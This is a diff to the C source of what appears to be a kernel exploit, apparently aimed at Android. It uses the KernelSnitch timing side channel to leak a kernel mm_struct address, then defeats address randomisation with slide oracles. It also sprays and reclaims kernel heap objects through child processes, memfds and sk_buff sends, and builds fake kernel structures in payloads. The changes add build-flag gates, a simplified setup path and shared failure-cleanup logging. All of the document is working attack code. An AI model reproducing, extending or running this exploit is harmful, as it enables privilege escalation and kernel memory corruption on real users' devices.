@@ -11,6 +11,7 @@ static struct mm_ctx pre_ctx;
 static struct mm_ctx post_ctx;
 static pid_t child_leak;
 
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 static int rmg_fast_profile_enabled(void) {
 #if defined(APP_DEFAULT_FAST_KSNITCH) && APP_DEFAULT_FAST_KSNITCH
   return 1;
@@ -113,6 +114,7 @@ static void log_mm_slabinfo(const char *stage) {
     pr_warning("mm slabinfo stage=%s entry missing\n", stage);
   }
 }
+#endif
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(SLIDE_P0_OFFSET_CANDIDATES)
@@ -154,9 +156,11 @@ uintptr_t slide_oracle_parent;
 uintptr_t slide_oracle_target;
 uintptr_t p0_gate_page_struct;
 uintptr_t p0_probe_page_struct;
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 uintptr_t fops_data_probe_addr;
 int fops_data_probe_active;
 int data_alias_uses_slide = 1;
+#endif
 char ashmem_path[256] = "/dev/ashmem";
 
 static void put_fake_waiter(unsigned char *payload, size_t waiter_off,
@@ -296,10 +300,21 @@ static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
 
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
       KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
   configure_kernelsnitch_profile(ks, PAGE_PAYLOAD_SLIDE);
+#else
+  ks = kernelsnitch_setup(
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  kernelsnitch_set_profile(
+      ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
+      SLIDE_KSNITCH_REPEAT_MEASUREMENT,
+      SLIDE_KSNITCH_AVERAGE);
+#endif
+#endif
 }
 
 int kernelsnitch_collisions_ready(void) {
@@ -310,6 +325,7 @@ void run_kernelsnitch_bruteforce(void) {
   kernelsnitch_bruteforce(ks);
 }
 
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 static uintptr_t canonicalize_kernelsnitch_pointer(uintptr_t leaked) {
 #if KERNELSNITCH_MTE_ENABLED
   if (leaked != (uintptr_t)-1) {
@@ -321,11 +337,16 @@ static uintptr_t canonicalize_kernelsnitch_pointer(uintptr_t leaked) {
 #endif
   return leaked;
 }
+#endif
 
 uintptr_t cleanup_kernelsnitch(void) {
   uintptr_t leaked = kernelsnitch_cleanup(ks);
   ks = NULL;
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   return canonicalize_kernelsnitch_pointer(leaked);
+#else
+  return leaked;
+#endif
 }
 
 void read_first_line(const char *path, char *buf, size_t len) {
@@ -499,8 +520,12 @@ uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
 }
 
 uintptr_t data_addr(uintptr_t image_addr) {
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   uintptr_t address = p0_data_alias(image_addr);
   return data_alias_uses_slide ? address + slide_p0_offset : address;
+#else
+  return p0_data_alias(image_addr) + slide_p0_offset;
+#endif
 }
 
 uintptr_t kaslr_image_addr(uintptr_t image_addr) {
@@ -722,6 +747,11 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
           uintptr_t direct_addr =
               P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) +
               P0_ORACLE_PROBE_OFFSET;
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+          if (p0_virtual_base_probe) {
+            direct_addr = data_addr(ASHMEM_MISC_FOPS);
+          }
+#endif
           parent = direct_to_page(direct_addr);
           target = pipebuf_page_base +
                    P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
@@ -970,9 +1000,27 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   return 1;
 }
 
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+static void cleanup_failed_kernel_page(const char *reason) {
+  pr_info("kernel page cleanup failure=%s stage=kernelsnitch begin\n", reason);
+  kernelsnitch_cleanup(ks);
+  ks = NULL;
+  pr_info("kernel page cleanup failure=%s stage=kernelsnitch done\n", reason);
+  pr_info("kernel page cleanup failure=%s stage=prepare-children begin count=%zu\n",
+          reason, prepare_ctx.mm_cnt);
+  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+    kill_child(prepare_ctx.childs[i]);
+  }
+  pr_info("kernel page cleanup failure=%s stage=prepare-children done\n", reason);
+  cleanup_page_prepare_state();
+}
+#endif
+
 uintptr_t prepare_kernel_page(int payload_mode) {
   close_reclaim_sockets();
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   cleanup_page_prepare_state();
+#endif
   mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
   prepare_ctxs();
 
@@ -992,6 +1040,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
       KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
@@ -1011,6 +1060,19 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION);
 #endif
   configure_kernelsnitch_profile(ks, payload_mode);
+#else
+  ks = kernelsnitch_setup(
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
+  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+    kernelsnitch_set_profile(
+        ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
+        SLIDE_KSNITCH_REPEAT_MEASUREMENT,
+        SLIDE_KSNITCH_AVERAGE);
+  }
+#endif
+#endif
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
@@ -1038,16 +1100,22 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     kill_child(spray_ctx.childs[i]);
   }
   SYSCHK(waitpid(child_leak, NULL, 0));
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   log_mm_slabinfo("after-child-exit");
+#endif
 
   if (!kernelsnitch_found_collisions(ks)) {
     pr_warning("KernelSnitch collision finding failed\n");
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+    cleanup_failed_kernel_page("collision");
+#else
     kernelsnitch_cleanup(ks);
     ks = NULL;
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
     }
     cleanup_page_prepare_state();
+#endif
     return 0;
   }
 
@@ -1055,18 +1123,25 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   uintptr_t leaked = ks->mm_struct;
   if (leaked == (uintptr_t)-1) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+    cleanup_failed_kernel_page("mm-leak");
+#else
     kernelsnitch_cleanup(ks);
     ks = NULL;
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
     }
     cleanup_page_prepare_state();
+#endif
     return 0;
   }
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   leaked = canonicalize_kernelsnitch_pointer(leaked);
   log_mm_slabinfo("after-leak");
+#endif
 
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   size_t object_index = (leaked - base) / MM_STRUCT_SZ;
   pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
           leaked, base, object_index);
@@ -1130,17 +1205,26 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     return 0;
   }
 #endif
+#else
+  pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
+          leaked, base, (leaked - base) / MM_STRUCT_SZ);
+#endif
   if (!prepare_skb_payload(base, payload_mode)) {
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+    cleanup_failed_kernel_page("skb-payload");
+#else
     kernelsnitch_cleanup(ks);
     ks = NULL;
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
     }
     cleanup_page_prepare_state();
+#endif
     return 0;
   }
 
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #ifdef APP_SLIDE_RECLAIM_SNDBUF
   int sndbuf = APP_SLIDE_RECLAIM_SNDBUF;
 #else
@@ -1162,6 +1246,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
           "set_ret=%d set_errno=%d get_ret=%d get_errno=%d\n",
           sndbuf, sndbuf_effective, sndbuf_set_ret, sndbuf_set_errno,
           sndbuf_get_ret, sndbuf_get_errno);
+#else
+  int sndbuf = 1 << 20;
+  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+#endif
   int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
   if (reclaim_flags >= 0) {
     fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
@@ -1215,7 +1303,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     SYSCHK(close(post_ctx.memfds[i]));
     post_ctx.memfds[i] = -1;
   }
-#if !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW)
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION && \
+    !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW)
   log_mm_slabinfo("after-target-neighbors");
 #endif
 
@@ -1228,16 +1317,19 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
   size_t drain_triggers = prepare_ctx.mm_cnt / mm_objs_per_slab;
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #ifdef APP_MM_LATE_DRAIN_TRIGGERS
   drain_triggers = APP_MM_LATE_DRAIN_TRIGGERS;
 #endif
   pid_t deferred_reap_children[drain_triggers ? drain_triggers : 1];
   size_t deferred_reap_count = 0;
   memset(deferred_reap_children, 0, sizeof(deferred_reap_children));
+#endif
   for (size_t i = 0; i < drain_triggers; i++) {
     size_t index = i * mm_objs_per_slab;
     SYSCHK(close(prepare_ctx.memfds[index]));
     prepare_ctx.memfds[index] = -1;
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #if (defined(APP_DEFER_ALL_DRAIN_REAPS) && \
      APP_DEFER_ALL_DRAIN_REAPS) || \
     (defined(APP_DEFER_FINAL_DRAIN_REAP) && \
@@ -1270,24 +1362,33 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       continue;
     }
 #endif
+#endif
     kill_child(prepare_ctx.childs[index]);
     prepare_ctx.childs[index] = -1;
   }
+#if !defined(APP_REQUIRE_FRESH_P0_SESSION) || !APP_REQUIRE_FRESH_P0_SESSION
+  pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
+#endif
   int reclaim_sends = SKB_RECLAIM_SENDS;
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   reclaim_sends = APP_SLIDE_RECLAIM_SENDS;
 #endif
   int reclaim_sent = 0;
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   int reclaim_errno = 0;
+#endif
   for (int i = 0; i < reclaim_sends; i++) {
     errno = 0;
     ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
     if (sent <= 0) {
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
       reclaim_errno = errno;
+#endif
       break;
     }
     reclaim_sent++;
   }
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   for (size_t i = 0; i < deferred_reap_count; i++) {
     SYSCHK(waitpid(deferred_reap_children[i], NULL, 0));
     pr_info("mm drain child reaped after reclaim index=%zu/%zu pid=%d\n",
@@ -1301,9 +1402,23 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   pr_info("sk_buff reclaim sends=%d/%d mode=%d stop_errno=%d\n",
           reclaim_sent, reclaim_sends, payload_mode, reclaim_errno);
   log_mm_slabinfo("after-exact-drain-reclaim");
+#else
+  pr_info("sk_buff reclaim sends=%d/%d mode=%d\n",
+          reclaim_sent, reclaim_sends, payload_mode);
+#endif
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+  pr_info("kernel page cleanup stage=kernelsnitch begin mode=%d base=%016zx\n",
+          payload_mode, base);
+#endif
   kernelsnitch_cleanup(ks);
   ks = NULL;
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+  pr_info("kernel page cleanup stage=kernelsnitch done mode=%d\n",
+          payload_mode);
 
+  pr_info("kernel page cleanup stage=prepare-children begin count=%zu\n",
+          prepare_ctx.mm_cnt);
+#endif
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     if (prepare_ctx.memfds[i] >= 0) {
       SYSCHK(close(prepare_ctx.memfds[i]));
@@ -1313,7 +1428,18 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       kill_child(prepare_ctx.childs[i]);
       prepare_ctx.childs[i] = -1;
     }
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+    if ((i + 1) % (8 * mm_objs_per_slab) == 0 ||
+        i + 1 == prepare_ctx.mm_cnt) {
+      pr_info("kernel page cleanup stage=prepare-children progress=%zu/%zu\n",
+              i + 1, prepare_ctx.mm_cnt);
+    }
+#endif
   }
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+  pr_info("kernel page cleanup stage=prepare-children done base=%016zx\n",
+          base);
+#endif
 
   return base;
 }
